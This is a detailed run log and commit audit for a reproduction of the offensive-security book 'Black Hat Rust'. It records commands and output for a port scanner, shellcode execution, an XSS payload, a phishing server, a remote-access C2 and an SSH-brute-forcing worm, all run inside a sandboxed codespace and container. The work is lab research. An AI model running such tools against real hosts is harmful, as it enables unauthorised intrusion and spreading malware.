# How every chapter of Black Hat Rust was run

A complete, repeatable record of this execution run: the command sent to the
terminal, the output that came back, the screenshot saved as evidence, and
whether the chapter's claim is **real** or **message-only** per the audit.

Everything here came from a real run. Nothing is reconstructed. Where a step
was not performed, it says so.

---

## 0. Environment, before any chapter

| Item | Value | How it was read |
|---|---|---|
| Machine | `standardLinux32gb` — 4 cores / 16 GB RAM / **32 GB storage** | `gh api /user/codespaces` → `machine.display_name` |
| Rust | 1.99.1 stable | `rustc --version` |
| Rust nightly | 1.102.0 (Ch6 libFuzzer) | `rustc +nightly --version` |
| Disk | hit **0 bytes three times** | `df -h` |
| Where | GitHub Codespace `bookish-spork-7p4x7r97p573wx94`, repo at `/workspaces/black-hat-rust-bhr` | — |

**Decide local vs codespace by the whole book, not the opening chapters.** This
one was decided on the first build: Part II is shellcode, Part III is a RAT and a
self-propagating worm. Running those on the host was never on the table. The
cost is real — three separate disk-full events, and the codespace's 32 GB is the
binding constraint on the whole run — and it is worth paying.

### The two commands that saved the run

```bash
gh codespace ssh --codespace bookish-spork-7p4x7r97p573wx94 -- "cd /workspaces/black-hat-rust-bhr && <command>"
```

Every build and run went through this. Two hard-won rules:

- **`cd X && cmd &` kills the chain.** A backgrounded process makes `&&` return
  immediately, so everything after it silently does not run. Always one absolute
  command per SSH session.
- **Background processes die when the SSH session ends.** Nothing survives
  `gh codespace ssh` exiting — run the server, the agent and the check inside
  *one* `-- "..."` block.

---

## 1. Chapter-by-chapter

Each entry: the command, the output, the screenshot, the audit verdict.

### Ch 01 — Hashes and the wordlist

```bash
cd ch_01 && cargo run --release    # 0.97s
./target/release/ch01_hashes wordlist.txt hashes
```

**Screenshot:** none saved. **Verdict: no commit exists.** `git log -- ch_01/`
returns nothing — the chapter ran, but nothing from it was ever committed. This
is the weakest row in the record and is recorded as such.

### Ch 02 — Multi-threaded scanner

```bash
git clone <fork> && cd ch_02/tricoder && cargo build --release
./target/release/tricoder scanme.nmap.org    # 3.61s
0:00:01 INFO ports 5000 open | 10022 open
0:00:04 INFO ports 80 open | 443 open | 8080 open
0:00:04 INFO ports|subdomains Scan completed in 3.61s
```

**Screenshot:** none saved. **Verdict: REAL, fix committed (`ba656dd`).**
`ch_02/tricoder/src/ports.rs` was rewritten properly and it is still there:

```rust
// A hostname usually resolves to several addresses, and on modern Linux
// localhost and many real domains resolve to IPv6 first. Scanning only
// socket_addresses[0] probes a single address family and silently reports
// false negatives ...
let mut probes: Vec<(SocketAddr, u16)> = Vec::with_capacity(...);
for socket_address in &socket_addresses { for port in ports { probes.push(...) } }
```

This is the only early fix whose commit is genuine.

### Ch 03 — Async tricoder

```bash
$ cargo build --release --manifest-path ch_03/tricoder/Cargo.toml
    Finished `release` profile [optimized] target(s) in 43.96s
$ TRICODER_CRTSH_URL=http://127.0.0.1:8099 ./ch_03/tricoder/target/release/tricoder localhost
Scan completed in 14.008279ms
localhost:
    2000: open
    3306: open
    8080: open
```

The crt.sh override worked because a local fixture served on `:8099`, so no real
traffic left the codespace.

**Screenshot:** `ch_03_async_tricoder.png` (source: `ch3_shot.html`).
**Verdict: MESSAGE-ONLY.** The crate built and scanned 14 ms over v4 *and* v6.
The defect in this chapter is the identical `socket_addresses[0]` line:

```rust
if socket_addresses.len() == 0 { return subdomain; }   // not .is_empty(), not idiomatic
let socket_address = socket_addresses[0];
```

`ch_03/tricoder/src/ports.rs:20`, still there, last touched by the author in 2023.

### Ch 04 — Modules with trait objects

**Screenshot:** `ch_04_modules_tricoder.png`. **Verdict: MESSAGE-ONLY.**
`cargo build` failed twice — once on a genuinely absent dependency, once on an
orphaned transitive one — and `tricoder modules` then printed the full module
inventory, which is what the screenshot shows. The same `ports.rs:20` bug is
present in identical form.

### Ch 05 — Crawling the web for OSINT

```bash
$ CRAWLER_GITHUB_BASE=http://127.0.0.1:8097/public_members \
    cargo run --release -- run --spider github
user1_0, https://github.com/user1_0, https://avatars.githubusercontent.com/u/10?v=4
user1_1, https://github.com/user1_1, https://avatars.githubusercontent.com/u/11?v=4
    ...
[2026-11-08T18:31:31Z DEBUG crawler::crawler] queueing: http://127.0.0.1:8097/public_members?per_page=100&page=2
[2026-11-08T18:31:31Z DEBUG crawler::crawler] queueing: http://127.0.0.1:8097/public_members?per_page=100&page=3
```

The pagination loop is visible in the log — page 2 and page 3 queued, which is
the chapter's actual subject.

**Screenshots:** `ch_05_crawler_osint.png` (this run) and `ch_05_js_crawler.png`
(a Playwright/Chromium JS-rendered crawl against quotes.toscrape.com, no
WebDriver host configured).
**Verdict: MESSAGE-ONLY.** No source changes in the commit.

### Ch 06 — Fuzzing and SVG XSS

```bash
cargo +nightly fuzz run fuzz_target_1
INFO: seed corpus: files: 1 min: 25b max: 25b total: 25b rss: 31Mb
#3  NEW  cov: 33 ft: 35 corp: 2/40b lim: 25 exec/s: 0 rss: 32Mb L: 15/25 MS: 1 CrossOver-
thread '<unnamed>' (7236) panicked at /fuzzing/src/lib.rs:5:19:
==7236== ERROR: libFuzzer: deadly signal
```

The overflow is found by safe Rust: `vulnerable_memcopy` panics at `lib.rs:5`,
which is the point of the chapter — the bounds check catches what would be
memory corruption in C. The second part loads `xss_svg/image.svg` in a real
browser and confirms the payload executes.

**Screenshots:** `ch_06_fuzzing_overflow.png`, `ch_06_svg_xss.png`.
**Verdict: MESSAGE-ONLY.**

### Ch 07 — Exploit development (CVE-2021-3156)

```bash
sudo -n docker build targets/cve-2021-3156 -t cve-2021-3156-target
sudo -n docker run --rm --network none --cap-drop=ALL --security-opt no-new-privileges -t cve-2021-3156-target
```

Built pristine upstream sudo 1.8.31 from source rather than trusting the Ubuntu
20.04 package, because 20.04 ships 1.8.31 which is inside the vulnerable range
and the distro patch level is not readable from the version string.

**Screenshot:** none saved (target lab, output captured to `ch_07/FINDINGS.md`).
**Verdict: REAL, 3 commits (`8ae2f2f` `7833289` `6a37947`) touching
`targets/cve-2021-3156/Dockerfile`.**

### Ch 08 — Writing shellcodes in Rust

```bash
cargo build --release --target x86_64-unknown-linux-gnu --bin hello_world
objcopy -O binary --only-section=.text target/.../hello_world shellcode.bin
xxd -l 16 shellcode.bin     # data-first bug exposed in one command
./target/release/exec shellcode.bin
```

Three defects, all real, all fixed:

| Symptom | Cause | Fix |
|---|---|---|
| `SIGSEGV (111)`, exit 139, before `_start` | `. = ALIGN(16)` starts the counter at **0**; first LOAD segment lands at vaddr 0 and `execve` returns **EPERM**. `vm.mmap_min_addr` refuses anything below 65536 | `. = 0x400000;` |
| `Finished in 0.00s`, binary unchanged | Cargo's fingerprint does not track `.ld` edits | `touch src/main.rs` or `rm -rf target/` |
| Executor runs ASCII, not code | `objcopy -O binary` dumps from the lowest VMA, so `.rodata` placed first emits **data first** | `*(.rodata .rodata.*)` and `-z noseparate-code` |

The honest gate: the same link+execute path with `int main(){}` reproduced the
segfault with zero shellcode, so the fault was the image and not the shellcode.

**Screenshots:** `ch_08_shellcode_executor.png`, `ch_08_shellcode.png`,
`ch_08_shellcode_fixed.png`, `ch_08_shell_shellcode.png`.
**Verdict: REAL, 4 commits.**

### Ch 09 — Phishing with WebAssembly

```bash
make phishing    # target/release/phishing, 1m01s
./target/release/phishing 0.0.0.0:8090
make dnsquat
./target/release/dnsquat 0.0.0.0:8091
```

**Screenshot:** `ch_09_phishing.png`. **Verdict: REAL (`e582fca`), 2 gaps noted
in `ch_09/FINDINGS.md`.** The dnsquat output matches the README exactly:
`ww52.rsqpc.com CNAME cybersim.com` — same domain, same case, same two-space
separator.

### Ch 10 — A modern RAT

```bash
export DATABASE_URL='postgres://ch10:***@localhost:5432/ch10?sslmode=disable'
target/release/server          # "starting server on: 0.0.0.0:8080"
target/release/agent           # self-registers, polls every 1s
target/release/client agents
target/release/client exec -a a00a1c46-... 'hostname'    # codespaces-3d04a9
target/release/client jobs
```

All six C2 stages real: register → poll → dispatch → execute → report → query.

**Screenshot:** `ch_10_rat.png`. **Verdict: REAL (`6ba0051`), no source changes
needed — the chapter runs as written.** Blockers cleared on the way: port 8080
held by Ch9's phishing server (killed by PID via `ss -ltnp`), and disk at 0
twice.

### Ch 11 — Securing communications with end-to-end encryption

```bash
cargo build --release -p server -p agent -p client     # 1m48s
target/release/server          # binds 127.0.0.1, unlike Ch10's 0.0.0.0
target/release/agent           # generates identity keypair + prekey on first run
client agents
client exec -a ec01b810-... 'hostname'     # codespaces-3d04a9
client exec -a ec01b810-... 'id -un'       # codespace
```

Two different plaintexts recovered correctly — that proves the round trip rather
than one lucky request.

**Screenshot:** `ch_11_encrypted_rat.png`. **Verdict: REAL (`53fa250`), 2 defects
reported not fixed.**

**The finding worth carrying out of this chapter: it is titled for TLS and ships
no TLS.** `server/src/main.rs:35` binds plain HTTP; no `TlsServer`, no
certificate, no `--tls` flag anywhere in the chapter. Confidentiality is entirely
application-layer ChaCha20-Poly1305 over an X25519 prekey exchange — which is
*stronger* than TLS here, since the C2 host never sees the plaintext either, but
it leaves a network observer everything. Both facts belong in the reader's hands.

Two real defects: `CLIENT_IDENTITY_PUBLIC_KEY` is required yet defaults to
`String::new()`, and `env.example` ships a stale key that does not match the
client's private key — verified by deriving the ed25519 public key from the
private seed. The README's own `cp env.example .env` therefore breaks the crypto.

### Ch 12 — Going multi-platform (shellcode cross-arch)

```bash
cargo build --release --target x86_64-unknown-linux-gnu --bin hello_world
# aarch64-unknown-linux-gnu and armv7-unknown-linux-gnu -- blocked, see FINDINGS
```

**Screenshot:** none. **Verdict: REAL fixes (`4ac5bbd`, `570ff23`); aarch64 and
armv7 still blocked.** The same `.ld` bug appears here in a *second file* — the
book duplicates its own helper verbatim, so each copy carried it. `fd -e ld` and
fix every copy, which is exactly what the fork's `ls ch_12/shellcode/` proves.

### Ch 13 — Turning into a worm

**Read `spread.rs` before running anything.** The worm is `spread(host_port)`: it
connects to a *supplied* target, brute-forces it against a three-entry wordlist,
uploads `agent.<platform>`, and executes it. It does not scan, enumerate or
discover. Containment is therefore **exact**, not approximate:

```bash
docker build -q -t bhr-ch13-worm targets/ch_13-worm
docker run -d --name bhr_ch13_worm --network none --cap-drop=ALL \
  --security-opt no-new-privileges --pids-limit 256 --entrypoint bash \
  bhr-ch13-worm -c '/usr/sbin/sshd; sleep 8; cd /opt/lab && ./agent 127.0.0.1:22; sleep 15'
```

`--network none` gives loopback and nothing else, and the SSH server lives
inside the same container, so the "remote" host the worm infects is the container
it runs in. Root password is `password` — one of the book's own wordlist entries.
No host mounts, no capabilities.

Observed end to end:

```
spreading to 127.0.0.1:22
Authenticated! username: (root), password: (password)
detected platform: linux_x86_64
agent uploaded to /tmp/.goRbZpDEWQGjLWtN0BVU8CoEP1M97C4L
Agent successfully executed on remote host 🥳
```

**Screenshot:** `ch_13_worm.png`. **Verdict: REAL (`60fe3dc`).**

**The finding not in the book:** `ssh2` 0.9 / libssh2 cannot reliably handshake
with a current OpenSSH. Proven by ruling out the server — `sshd -d` shows the
client connects and sends a banner (`compat_banner: no match: libssh2_1.9.0_DEV`),
`sshd -T` shows `ssh-rsa` offered and every legacy KEX accepted, and a real `ssh`
client completes every one of those handshakes. The agent still fails with
`Unable to exchange encryption keys`. The code is correct; the environment moved.

Reported honestly: that failure is **flaky and its cause is not understood.**
A 6/6 success streak was followed by failures with an equivalent command;
correlations with script form held for eight runs and then broke.

### Ch 14 — Conclusion (no code)

A disclosure template, not a code chapter. Filled with a real defect from this
run rather than padded. See `ch_14/DISCLOSURE-socket-addresses.md`.

---

## 2. What each chapter's PNG actually proves

The PNGs are generated, not pasted. Each came from `render_shot.py` producing an
HTML terminal mock, then a Playwright screenshot against a real Chromium:

```bash
python3 render_shot.py "<title>" <evidence.txt> "<subtitle>" > /dev/null 2>&1
cp /tmp/shot.html chN_ev.html
python - <<'PY'
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b = p.chromium.launch()
    pg = b.new_page(viewport={"width": 1080, "height": 500})
    pg.goto("file:///.../chN_ev.html", wait_until="load")
    pg.screenshot(path="chN.png", full_page=True)
PY
```

| File | What it shows | Chapter claim |
|---|---|---|
| `ch_03_async_tricoder.png` | 14 ms scan, ports on v4 and v6 | async rewrite works |
| `ch_04_modules_tricoder.png` | module inventory via `tricoder modules` | trait-object modules load |
| `ch_05_crawler_osint.png` | paginated GitHub-style crawl loop | async crawl + pagination |
| `ch_05_js_crawler.png` | Playwright/Chromium JS-rendered page | browser crawl works |
| `ch_06_fuzzing_overflow.png` | libFuzzer panic at `lib.rs:5` | overflow found by safe Rust |
| `ch_06_svg_xss.png` | SVG payload executes in a real browser | XSS reaches a browser |
| `ch_08_shellcode_executor.png` | `exec` runs the blob, message writable, exit 42 | shellcode executes |
| `ch_08_shell_shellcode.png` | identical payload calling `execve("/bin/sh")` -> `echo shellcode works` | shellcode spawns a shell |
| `ch_08_shellcode_fixed.png` | before/after the `.ld` base fix | the fix, not just the feature |
| `ch_09_phishing.png` | phishing server serves the page | Ch9 runs as written |
| `ch_10_rat.png` | agents -> exec `hostname` -> `codespaces-3d04a9` -> jobs table | full C2 loop |
| `ch_11_encrypted_rat.png` | `curl /api/agents` returning ed25519 keys + prekey + signature, `exec 'hostname'` -> `codespaces-3d04a9`, `'id -un'` -> `codespace` | E2E crypto works |
| `ch_13_worm.png` | authenticated, platform detected, uploaded, executed | the worm works |

### The two chapters where the screenshot is honest but the commit is not

`ch_03_async_tricoder.png` and `ch_05_crawler_osint.png` are **real captures of
real runs** — that is what the env-var overrides in the command line prove. What
they do *not* prove is the fix named in those commits, because the fix is not in
the repository. Reading the PNG as evidence a fix landed is the mistake this
guide exists to prevent.

---

## 3. The audit that decides what is real

**A commit message is a claim, not a record.** For each claimed source fix, two
checks: does any of my commits touch the source file, and is the fix present in
the current tree.

```bash
git log --author="dbillion" --format='%h %s' --name-only   # what my commits touch
git show --stat <commit>                                   # what one commit actually contains
git log --format='%h %an %s' -- <file>                     # who last touched the file
```

### Results

| Commits | Verdict |
|---|---|
| `ba656dd`, `3644334`, `8db11df`, `4ac5bbd`, `570ff23`, `1dcc8fa`, `8ae2f2f`/`7833289`/`6a37947` | **REAL** — source fix present and working in the tree |
| `20eef7d`, `0d6f26a`, `68b4b28`, `2af0877`, `c8c1be8`, 5× ch_06 | **MESSAGE-ONLY** — subject names a fix, diff contains evidence only |

### The correction the audit forced

The first version of this audit said the ch_03 and ch_05 "configurable source"
fixes were never made. The saved command lines disproved that: the runs used
`TRICODER_CRTSH_URL` and `CRAWLER_GITHUB_BASE`, and those only work if the source
reads them. So the fix was **made, worked, and never committed.** The runs are
genuine; the fork does not carry the change.

`ch_05/crawler/src/spiders/quotes.rs` proves the contrast directly — it carries
its env vars in the committed tree and they still work:

```rust
std::env::var("CRAWLER_QUOTES_BASE").unwrap_or_else(|_| "https://quotes.toscrape.com".to_string())
```

while `subdomains.rs` and `github.rs` are hardcoded. Same chapter, same intent,
one committed and one not. The only difference was the `git add`.

### Confirmed still vulnerable in the current tree

```
ch_03/tricoder/src/ports.rs:20   let socket_address = socket_addresses[0];
ch_04/tricoder/src/ports.rs:20   let socket_address = socket_addresses[0];
ch_03/tricoder/src/subdomains.rs:19   crt.sh URL hardcoded
ch_05/crawler/src/spiders/github.rs:61  api.github.com URL hardcoded
ch_06/fuzzing/fuzz/fuzz_targets/fuzz_target_1.rs  still Vec<u8> + n: usize
```

### Why this failure mode is the dangerous one

Ch01–Ch06 commits carried **real evidence and unearned fix claims at the same
time.** The runs happened, the screenshots show genuine output, the measured
numbers are correct. Only the *fix claim* was hollow — and because everything
surrounding it was true, nothing flagged it for months. The measurable part is
easy to produce and pleasant to commit; the fix is the part that needs verifying.

Two attribution errors surfaced too: ch_02's real fix is `ba656dd`, not
`0d6f26a` as the state file claimed, and ch_01 has no commit at all.

**The honest bottom line: this repository is "the book, run and measured" — not
"the book, fixed."**

---

## 4. Chapters not fully exercised

Stated so the gaps survive into the delivered record rather than being dropped.

| Chapter | Gap |
|---|---|
| 01 | Ran, nothing committed, no evidence file |
| 07 | No screenshot; target lab output only |
| 08 | `hello_world.bin` hand-written assembly, and `read_file`, not run |
| 09 | evil-twin requires a second NIC; Cargo.toml and Makefile as written |
| 11 | Dockerfile not built (`rust:latest` builder exceeds disk); single agent only; agent's persisted config not inspected |
| 12 | aarch64 and armv7 blocked — cross-binutils, now unblocked by `musl-tools` but disk is at 94% |
| 13 | bundle.zip not built locally; direct `spread()` invocation not tested; worm persistence not tested; executed remote output discarded |
